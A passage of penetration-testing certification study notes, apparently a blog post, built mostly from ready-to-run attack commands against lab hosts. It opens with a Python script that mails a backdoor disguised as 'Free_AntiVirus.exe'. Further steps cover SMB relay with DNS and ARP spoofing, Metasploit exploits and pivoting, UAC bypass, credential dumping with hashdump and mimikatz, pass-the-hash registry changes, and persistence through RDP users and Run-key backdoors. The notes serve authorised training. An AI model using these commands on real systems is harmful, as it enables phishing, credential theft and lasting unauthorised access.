</span><span class="n">body</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Body_of_the_mail</span><span class="sh">"</span>
<span class="c1"># attach the body with the msg instance
</span><span class="n">msg</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="nc">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="sh">'</span><span class="s">plain</span><span class="sh">'</span><span class="p">))</span>
<span class="c1"># open the file to be sent 
</span><span class="n">filename</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Free_AntiVirus.exe</span><span class="sh">"</span>
<span class="n">attachment</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/backdoor.exe</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
<span class="c1"># instance of MIMEBase and named as p
</span><span class="n">p</span> <span class="o">=</span> <span class="nc">MIMEBase</span><span class="p">(</span><span class="sh">'</span><span class="s">application</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">octet-stream</span><span class="sh">'</span><span class="p">)</span>
<span class="c1"># To change the payload into encoded form
</span><span class="n">p</span><span class="p">.</span><span class="nf">set_payload</span><span class="p">((</span><span class="n">attachment</span><span class="p">).</span><span class="nf">read</span><span class="p">())</span>
<span class="c1"># encode into base64
</span><span class="n">encoders</span><span class="p">.</span><span class="nf">encode_base64</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">add_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Disposition</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">attachment; filename= %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">filename</span><span class="p">)</span>
<span class="c1"># attach the instance 'p' to instance 'msg'
</span><span class="n">msg</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="c1"># creates SMTP session
</span><span class="n">s</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="nc">SMTP</span><span class="p">(</span><span class="sh">'</span><span class="s">demo.ine.local</span><span class="sh">'</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
<span class="c1"># Converts the Multipart msg into a string
</span><span class="n">text</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="nf">as_string</span><span class="p">()</span>
<span class="c1"># sending the mail
</span><span class="n">s</span><span class="p">.</span><span class="nf">sendmail</span><span class="p">(</span><span class="n">fromaddr</span><span class="p">,</span> <span class="n">toaddr</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
<span class="c1"># terminating the session
</span><span class="n">s</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>

</code></pre></div></div>

<p>Source: https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/</p>

<blockquote>
  <p>send the python email and open a listener in meterpreter to receive the shell</p>
</blockquote>

<ul>
  <li>get better privilege
getsystem
getuid</li>
</ul>

<blockquote>
  <p>However, we cannot access that machine (10.0.17.12) from the Kali machine. So, here we need to perform pivoting by adding route from the Metasploit framework.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CTRL + C
y
run autoroute -s 10.0.17.12/20
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/proxychains4.conf
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>background
use auxiliary/server/socks_proxy
show options
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set SRVPORT 9050
set VERSION 4a 
exploit
jobs
</code></pre></div></div>

<ul>
  <li>run nmap with proxychains to discover open ports in the second machine</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	proxychains nmap demo1.ine.local -sT -Pn -p 1-100
</code></pre></div></div>

<blockquote>
  <p>We can forward the port to find the running application name and version. However, looking at them, we can easily guess that port 80 is \for Httpd service</p>
</blockquote>

<ul>
  <li>Step 14: We are forwarding port 80 to the attacker machines port 1234</li>
</ul>

<p>Commands</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions -i 1
portfwd add -l 1234 -p 80 -r 10.0.17.12
portfwd list
</code></pre></div></div>

<ul>
  <li>run nmap in the forwarded port</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -p 1234 localhost
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit badblue 2.7 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bg
search badblue
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/http/badblue_passthru
show options
</code></pre></div></div>

<blockquote>
  <p>The demo1.ine.local <second machine="">
machine is not accessible from the Kali machine, so we cant use the
**reverse_tcp**
payload. This is an essential step For us to choose the correct payload. In this case, we have to use the
**bind_tcp**
payload to gain the meterpreter session.</second></p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set RHOSTS demo1.ine.local
set PAYLOAD windows/meterpreter/bind_tcp
exploit
getuid
sysinfo
</code></pre></div></div>

<h2 id="lab-dns--smb-relay">LAB DNS &amp; SMB Relay</h2>
<p>myip: 172.16.5.150</p>

<p>internal pentest
scope: 172.16.5.0/24</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.5.10 - DC - domain
172.16.5.30 - sales.sportsfoo.com
172.16.5.31 - finance.sportsfoo.com
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig @172.16.5.10 -x 172.16.5.10 +nocookie

dig @172.16.5.10 -t AXFR sportsfoo.com +nocookie

cat hostnames.txt
marketing
consulting
sales
support
department1
department2
department3
department4
department5

</code></pre></div></div>

<blockquote>
  <table>
    <tbody>
      <tr>
        <td>for name in $(cat hostnames.txt); do host $name.sportsfoo.com 172.16.5.10 -W 2; done</td>
        <td>grep ‘has address’</td>
      </tr>
    </tbody>
  </table>
</blockquote>

<ul>
  <li>we can use /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
consulting.sportsfoo.com has address 172.16.5.41
development.sportsfoo.com has address 172.16.5.33
engineering.sportsfoo.com has address 172.16.5.40
fileserver.sportsfoo.com has address 172.16.5.17
intranet.sportsfoo.com has address 10.10.10.10
legal.sportsfoo.com has address 172.16.5.39
marketing.sportsfoo.com has address 172.16.5.32
sales.sportsfoo.com has address 172.16.5.30
security.sportsfoo.com has address 172.16.5.35
support.sportsfoo.com has address 172.16.5.36
www.sportsfoo.com has address 10.10.10.10


Reverse DNS lookups
	crunch 11 11 -t 172.16.5.%% -o iplist.txt

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c">#!/bin/bash</span>
<span class="k">for </span>ip <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>iplist.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>dig @172.16.5.10 <span class="nt">-x</span> <span class="nv">$ip</span> +nocookie<span class="p">;</span> <span class="k">done</span>

</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ./reverse-dnsscript.sh | grep sportsfoo.com | grep PTR
10.5.16.172.in-addr.arpa. 1200  IN      PTR     dc01.sportsfoo.com.
17.5.16.172.in-addr.arpa. 1200  IN      PTR     fileserver.sportsfoo.com.
30.5.16.172.in-addr.arpa. 3600  IN      PTR     sales.sportsfoo.com.
31.5.16.172.in-addr.arpa. 3600  IN      PTR     finance.sportsfoo.com.
32.5.16.172.in-addr.arpa. 3600  IN      PTR     marketing.sportsfoo.com.
33.5.16.172.in-addr.arpa. 3600  IN      PTR     development.sportsfoo.com.
34.5.16.172.in-addr.arpa. 3600  IN      PTR     customerservice.sportsfoo.com.
35.5.16.172.in-addr.arpa. 3600  IN      PTR     security.sportsfoo.com.
36.5.16.172.in-addr.arpa. 3600  IN      PTR     support.sportsfoo.com.
37.5.16.172.in-addr.arpa. 3600  IN      PTR     players.sportsfoo.com.
38.5.16.172.in-addr.arpa. 3600  IN      PTR     goalkeepers.sportsfoo.com.
39.5.16.172.in-addr.arpa. 3600  IN      PTR     legal.sportsfoo.com.
40.5.16.172.in-addr.arpa. 3600  IN      PTR     engineering.sportsfoo.com.
41.5.16.172.in-addr.arpa. 3600  IN      PTR     consulting.sportsfoo.com.
42.5.16.172.in-addr.arpa. 3600  IN      PTR     commercial.sportsfoo.com.
43.5.16.172.in-addr.arpa. 3600  IN      PTR     coaches.sportsfoo.com.
44.5.16.172.in-addr.arpa. 3600  IN      PTR     doctors.sportsfoo.com.
45.5.16.172.in-addr.arpa. 3600  IN      PTR     delivery.sportsfoo.com.

</code></pre></div></div>

<ul>
  <li>find live hosts</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nmap -sP 172.16.5.* -oG - | awk '/Up/{print $2}' &gt; alive.txt &amp;&amp; cat alive.txt
</code></pre></div></div>

<ul>
  <li>guessing OS with NMAP</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nmap -O -iL alive.txt --osscan-guess
</code></pre></div></div>

<ul>
  <li>guessing OS with metasploit</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	use auxiliary/scanner/smb/smb_version
</code></pre></div></div>

<ul>
  <li>
    <p>Scan with nmap</p>
  </li>
  <li>
    <p>Prepare the SMB Relay</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	use exploit/windows/smb/smb_relay
</code></pre></div></div>

<blockquote>
  <p>send link via email and open in the target machine
	<a href="file://\\172.16.5.150\admin$">here</a></p>
</blockquote>

<ul>
  <li>
    <p>Task 7
At this point, we are going to deal with a more complicated situation, where users are smart enough to recognize malicious messages. Also, our next target is a W7 box patched against MS08-068 vuln.
With that said, we need to launch an attack using SMB Relay in a way that once the W7 system starts an SMB connection to any host on the .sportsfoo.com domain its redirected to our Metasploit server. Then, we can use their credentials to get a shell on the DC.</p>
  </li>
  <li>
    <p>3 Steps</p>
  </li>
</ul>

<p>1 - Lets use the same exploit</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	use exploit/windows/smb/smb_relay
	set srbhost = our ip
	set smbhost = 172.16.5.10 (Domain Controller)
</code></pre></div></div>

<p>2 - To redirect the victim to our Metasploit system:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	echo "172.16.5.150 *.sportsfoo.com" &gt; dns
	dnsspoof -i tap0 -f dns
</code></pre></div></div>

<p>3 - MITM attack (poison the traffic between the target and the gateway):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	echo 1 &gt; /proc/sys/net/ipv4/ip_forward
	arpspoof -i tap0 -t 172.16.5.30 172.16.5.1
	arpspoof -i tap0 -t 172.16.5.1 172.16.5.30
</code></pre></div></div>

<ul>
  <li>Theory Behind</li>
</ul>

<blockquote>
  <p>For example, from the previous results, Windows7 has started an SMB connection \for \fileserver01.sportsfoo.com\AnyShare. Then instead of get a DNS response with the real IP address of fileserver01.sportsfoo.com, it received the IP of the attacker: 172.16.5.153. Consequently, the SMB connection is hijacked to \172.16.5.153\AnyShare.</p>
</blockquote>

<blockquote>
  <p>In Metasploit, every time there is an incoming SMB connection, the SMB Relay exploit grab the SMB hashes (credentials) and then uses them to get a shell on the Domain Controller (172.16.5.10 - since it was set in the SMBHOST field of the smb-relay exploit).</p>
</blockquote>

<blockquote>
  <p>This is possible because the credentials in use sportsfoo\bcaseiro belongs to a domain administrator account. Hence, they can be used to get a shell in any Windows system \for that domain.</p>
</blockquote>

<ul>
  <li>After all the 3 steps. We got a meterpreter shell in DC host.</li>
</ul>

<blockquote>
  <p>[!CONFIG]</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables -L = to list
iptables -F = to flush
iptables -P FORWARD ACCEPT 
// my FORWARD was set to DROP before, that why the packets were not coming from the network
</code></pre></div></div>

<h1 id="post-exploitation">Post Exploitation</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The last technical stage before the reporting phase.

* Never forget about the rules of the engagement, make sure you have the permissions and the rights to modify services, machine configurations, escalate privileges, gather sensitive information, delete logs etc
* Keep track of actions taken against the compromised machines. This includes date and time, changes made to machines documents, services, applications and configurations, but also private data discovered, methods used to maintain access and so on. This information (containing the list of changes made) should then be included in the final report.
* All data discovered and gathered must be protected. This means that you must encrypt it on your pentesting machine, and permanently delete it once the pentest is completed.
* Even when reporting sensitive information to your client, such as a screenshot containing username or passwords, be sure to always obfuscate and mask data.
* maintain access or persistence, when using backdoor implement some type of authentication ( to avoid others from use it) and delete everything the pentest is complete.
</code></pre></div></div>

<p>The four post-exploitation steps:</p>

<p><img src="/assets/images/posts/2023-11-19-ecppt/22.png" alt="Alt text" class="align-center" /></p>

<h2 id="privilege-escalation-and-maintaining-access">Privilege Escalation and Maintaining Access</h2>

<p>Vertical:
	The attacker is able to move from a lower privileged user to a higher privileged user. For example from a low-end user to administrator or root user.</p>

<p>Horizontal:
	The attacker keeps the same set or level of privileges but assumes the identity of a different user (he/she does not gain any further privilege).</p>

<blockquote>
  <p>In this phase we will make sure that our session is:
	Stable (does not get dropped)
	Privileged (can run with high privileges)
	Persistent (through reboots)</p>
</blockquote>

<h3 id="stability-windows">STABILITY Windows</h3>

<h4 id="migrate">Migrate</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To avoid losing the session on the target, one of the first tasks to perform is to "migrate" the session to another process.
</code></pre></div></div>

<p>To let Metasploit automatically migrate to another process, we can use:
	run post/windows/manage/migrate
	getpid = you will see that the process changes
	it will migrate to a process with the same privileges as the current session = notepad.txt</p>

<p>Or we can do it manually:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	ps = to show processes
	migrate &lt;PID&gt;
</code></pre></div></div>

<h4 id="getsystem">Getsystem</h4>
<p>getsystem it will automatically find the best technique to elevate privileges. 
works only in Windows.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getsystem -t 1 = if u want to run a specific technique
getprivs = to show what privileges do we have
</code></pre></div></div>

<blockquote>
  <p>We can navigate to exploit/[OS]/local to show which modules metasploit offers</p>
</blockquote>

<h4 id="bypassuac">BypassUAC</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>post/windows/gather/win_privs = to verify if UAC is enabled
// if the column is set to true, it means that the remote system has the UAC enabled

search bypassuac
</code></pre></div></div>

<ol>
  <li>Select the bypassuac_vbs module, since its the newest module</li>
  <li>Set the session ID on which the module will be executed</li>
  <li>Run the module</li>
</ol>

<ul>
  <li>if the module completes, we will get a new meterpreter session with highest privileges. Remember that this is a bypass, so UAC will still be enabled on the target.
once we have a better shell, we can try <strong>getsystem</strong> again to try to gain a high privilege access.
// set to x64 For better shell</li>
</ul>

<p>https://github.com/hfiref0x/UACME
we can upload UACME with a msfvenom payload</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mfvenom -p windows/x64/meterpreter/reverse_tcp
</code></pre></div></div>

<p>set a listener
exploit/multi/handler 
// with the same options of the payload
background the session</p>

<p>execute the UAC in the target machine</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Akagi64.exe 10 &lt;path to the payload.exe&gt;
</code></pre></div></div>

<blockquote>
  <p>We should get a new shell in our listener
use getsystem</p>
</blockquote>

<h4 id="incognito">Incognito</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.gracefulsecurity.com/privesc-stealing-windows-access-tokens-incognito/
https://technet.microsoft.com/en-us/library/cc759267(v=ws.10).aspx
</code></pre></div></div>

<p>Thanks to incognito, we can impersonate other valid user tokens on that machine and became that user.
being able to switch users gives us the possibility to access different local or domain resources.</p>

<p>in meterpreter session:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use incognito
list_tokens -u
impersonate_token &lt;token&gt;
</code></pre></div></div>

<h4 id="unquoted-service-paths">Unquoted Service Paths</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://cwe.mitre.org/data/definitions/428.html
</code></pre></div></div>

<p>with this vuln we are able to abuse the way that Windows searches For executables belonging to a service.
// This issue arises when a Windows service has been configured with a path to a service binary which is unquoted, and additionally, contains spaces in its path.
// if we have permission in the spaces of the path, we can abuse by putting a malicious program there</p>

<ul>
  <li>Find the vulnerability</li>
</ul>

<p>query all services and paths</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v 

</code></pre></div></div>

<ul>
  <li>query a specific service</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc qc AdobARMservice
sc qc CIJSRegister
</code></pre></div></div>

<ul>
  <li>try to stop and start the service without errors</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop &lt;service&gt;
sc start &lt;service&gt;
</code></pre></div></div>

<ul>
  <li>SERVICE_START_NAME</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	sc qc &lt;service&gt;
</code></pre></div></div>

<blockquote>
  <p>if the service_start_name is set to LocalSystem, this tell us that we will gain system access</p>
</blockquote>

<ul>
  <li>next step
stop the service:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc stop &lt;service&gt;
</code></pre></div>    </div>
  </li>
</ul>

<p>enter the application path:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd "C:\program Files\Vmware"
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls "path of the service"
icacls "C:\Program Files\OpenVPN\bin"
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NT AUTHORITY\Authenticated Users: (OI) (CI) (M)
// the (M) = we can modify the content of the directory
</code></pre></div></div>

<ul>
  <li>Generate a payload in msfvenom and upload to the path of the vuln application</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload payload.exe "C:\\program files\\Vmware\\Vmware Tools\\Vmware.exe"
</code></pre></div></div>

<ul>
  <li>Open a listener</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/multi/handler
</code></pre></div></div>

<ul>
  <li>go back to the session and start the service</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	sc start VGAuthservice
</code></pre></div></div>

<blockquote>
  <p>we should gain a new session
if the shell is unstable
background the session
set AutoRunScript migrate -n svchost.exe
exploit</p>
</blockquote>

<blockquote>
  <p>this will run the script again
stop the service again and start
we should gain a new shell</p>
</blockquote>

<ul>
  <li>with metasploit</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/local/trusted_service_path
</code></pre></div></div>

<h3 id="stability-linux">STABILITY Linux</h3>

<h4 id="os-vulns">OS vulns</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysinfo
uname -a
</code></pre></div></div>

<ul>
  <li>search in google … etc</li>
</ul>

<p>Compile on the target:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; shell / execute -f /bin/sh -i -c
gcc --version
gcc &lt;program.c&gt; -o exploit
./exploit
</code></pre></div></div>

<p>Compile on our machine:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Since our OS is 64-bit and the target is 32-bit, we need set gcc parameters accordingly.
gcc -m32 -o exploit &lt;program.c&gt;
upload to the target, make it executable 
run
</code></pre></div></div>

<blockquote>
  <p>[+] info
A service is running with system privileges and its executable is stored in a folder on which we have write permission.
We can use msfvenom to create a payload
Inject it with tools like Shellter, BDF and so on.
After that we can replace the file with the one just created and force the service to restart.
https://www.shellterproject.com/introducing-shellter/
https://github.com/secretsquirrel/the-backdoor-factory</p>
</blockquote>

<h3 id="maintaining-access">Maintaining Access</h3>
<p>The purpose of this phase is to make our presence on the machine persistent - creating a backdoor readily available For later use.</p>
<h4 id="password-and-hashes">Password and Hashes</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run post/windows/gather/smart_hashdump
creds or loot = to see the saved hashes
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run hashdump
// must be system
// In case of error, migrate to a differente process and try again
</code></pre></div></div>

<h4 id="pass-the-hash">Pass the hash</h4>
<p>with the hashes in hand.
	Is a technique that allows us to connect to a remote machine, by means of the hash without using the actual plain-text password.</p>

<p>use exploit/windows/smb/psexec</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set SMBPass = the password hash
set SMBUser = the username
set RHOST = the remote host IP - target
</code></pre></div></div>

<blockquote>
  <p>error = STATUS_ACCESS_DENIED
if we try the psexec module from a session where our current user is in the Administrator group, but not an actual administrator, and we get a STATUS_ACCESS_DENIED error, this is a good indication that registry changes may be required on the target host in order For a successfull pass-the-hash attack.</p>
</blockquote>

<ul>
  <li>The two registry entries needed on the target For this to be successfull are:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
	add a new DWORD (32-bit) named: LocalAccountTokenFilterPolicy - set its value to 1
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters
	add a new DWORD (32-bit) named: RequireSecuritySignature - set its value to 0
</code></pre></div></div>

<ul>
  <li>via meterpreter:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg setval -k &lt;hklm...&gt; -v &lt;name&gt; -t &lt;REG_DWORD&gt; -d 1
</code></pre></div>    </div>
  </li>
  <li>We can modify via Powershell commands:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
	Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord
</code></pre></div></div>

<ul>
  <li>We can modify via reg command:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
	reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
</code></pre></div></div>

<blockquote>
  <p>moreover = https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/</p>
</blockquote>

<h4 id="pass-the-hash-over-rdp">Pass-The-Hash over RDP</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;NTLM hash&gt; /v:&lt;ip&gt;
</code></pre></div></div>

<h4 id="mimikatz">Mimikatz</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/gentilkiwi/mimikatz/wiki Its a tool able to extract plaintext password, kerberos tickets, perform pass-the-hash attacks etc important to have the current meterpreter session running on a 64-bit process. this allows mimikatz to load all features without any issues
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	ps -A x86_64 -s
	// -A = architecture
	// -s = system processes
	migrate &lt;PID&gt;

load mimikatz
	wdigest credentials

</code></pre></div></div>

<h4 id="windows-credentials-editor--wce-">Windows Credentials Editor ( WCE )</h4>
<p>its a windows binary, so you will have to upload on the remote machine and then run it from meterpreter session.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>execute -i -f wce.exe -a -h
</code></pre></div></div>

<blockquote>
  <p>moreover - https://web.archive.org/web/20200414231958/http:/www.ampliasecurity.com/research/windows-credentials-editor/</p>
</blockquote>

<h4 id="rdp-service">RDP Service</h4>
<p>lets check if the RDP service is active, since we wanna use For backdoor access.</p>

<ul>
  <li>meterpreter session:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
net start 
(Remote Desktop Configuration, Remote Desktop Services, Remote Desktop Services UserMode)
// only by typing net start, we should see the services available
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic service where 'Caption like "Remore%" and started=true' get Caption

meterpreter: 
	run service_manager -l
	run post/windows/gather/enum_services
</code></pre></div></div>

<h4 id="enable---persistence-through-rdp">Enable - persistence through rdp</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run getgui -e = enable rdp
//-p &lt;password&gt; -u &lt;user&gt; = if we want to add a new user and password
run getgui -e -u talent -p talent
</code></pre></div></div>

<blockquote>
  <p>if the target user its not allowed to connect through RDP, we will have to grant him this privilege by adding him to the Remote Desktop Users group.
And we have to be sure that the Firewall does not block us</p>
</blockquote>

<blockquote>
  <p>we assume that this group has this policy assigned.
Security Settings &gt; Local Policies &gt; User rights Assignment &gt; Allow log on through Remote Desktop Services
if the box is hardened this might not be the case</p>
</blockquote>

<ul>
  <li>from Windows shell:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup "Remote Desktop Users" els_user /add
// "Remote Desktop Users" = group we wanna add our user
// els-_user = username
</code></pre></div></div>

<ul>
  <li>Now we can access</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup 
</code></pre></div></div>

<p>// to list all the groups</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup "Remote Desktop Users"
// to list the users in that specific group
</code></pre></div></div>

<ul>
  <li>Now that we have the groups list, we could add the user to one of them.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup "group" &lt;user&gt; /add
</code></pre></div></div>

<blockquote>
  <p>We can do the same process with Telnet
Verify if the service is running
add an user to TelnetClients group
This way you can connect back through telnet with the same username/password</p>
</blockquote>

<h3 id="backdoor">Backdoor</h3>
<p>goal: use Metasploit in order to generate an executable file (backdoor) that will persist through reboots of the victim machine.</p>

<ol>
  <li>Upload the backdoor on the victim</li>
  <li>Execute the file. At prefixed times (5-6-10 seconds), it will try to connect back to our listener</li>
  <li>Run it automatically at boot. Depending on the OS, this can be done by editing the Windows Registry, services, schedules, rc.local, init.d</li>
</ol>

<h4 id="persistence">Persistence</h4>
<p>meterpreter session:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run persistence 
// -h = to show all the options
// -A = starts the handler on our machine
// -X = start the agent at boot // -X requires SYSTEM privileges
// -i 5 = connection attemp each 5 seconds
// -p 8080 = port of the connect back
// -r &lt;ip&gt; = our ip address

run persistence -A -X -i 5 -p 8080 -r &lt;kali ip&gt;
// automatically creates the backdoor, uploads it and sets the registry keys to start it at boot

</code></pre></div></div>

<p>once the process is complete, if we want a session on the target, we have to start a listener</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/multi/handler
// set the same options as the backdoor

//another option 
exploit/windows/local/persistence

</code></pre></div></div>

<h4 id="manual-persistence">Manual persistence</h4>
<p>Suppose we crafted our own backdoor with msfvenom/Veil/BDF
	https://github.com/Veil-Framework/
	https://github.com/secretsquirrel/the-backdoor-factory</p>

<ol>
  <li>Upload the file:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload &lt;path to backdoor file&gt; &lt;path on target&gt;
upload /root/backdoor.exe C:\\windows\
</code></pre></div></div>

<ol>
  <li>Edit the registry in order to load your file at startup:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg setval -k &lt;registry key path&gt; -d &lt;value of key&gt; -v &lt;name of key&gt;
reg setval -k HKLM\\Software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\backdoor.exe" -v backdoor_name

</code></pre></div></div>

<h3 id="new-users">New Users</h3>

<ul>
  <li>add a new user:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	net user &lt;user&gt; &lt;pass&gt; /add
</code></pre></div></div>

<ul>
  <li>add to a group:</li>
</ul>

